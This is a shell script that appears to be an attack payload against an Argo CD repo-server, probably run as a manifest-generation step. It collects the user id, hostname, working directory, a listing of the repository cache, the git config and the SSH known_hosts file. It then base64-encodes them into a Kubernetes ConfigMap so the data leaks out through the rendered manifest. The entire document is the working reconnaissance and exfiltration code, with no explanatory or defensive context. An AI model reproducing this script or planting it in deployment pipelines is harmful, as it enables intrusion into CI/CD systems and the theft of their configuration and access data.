#!/bin/sh
RECON=$( (
echo "===WHOAMI==="
id
echo "===HOSTNAME==="
hostname
echo "===PWD==="
pwd
echo "===REPO_CACHE==="
ls /tmp/_argocd-repo/ 2>/dev/null | head
echo "===GIT_CONFIG==="
cat ~/.gitconfig 2>/dev/null
echo "===KNOWN_HOSTS==="
head /app/config/ssh/ssh_known_hosts 2>/dev/null
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: u2u
data:
  result: $RECON
EOF
exit 0
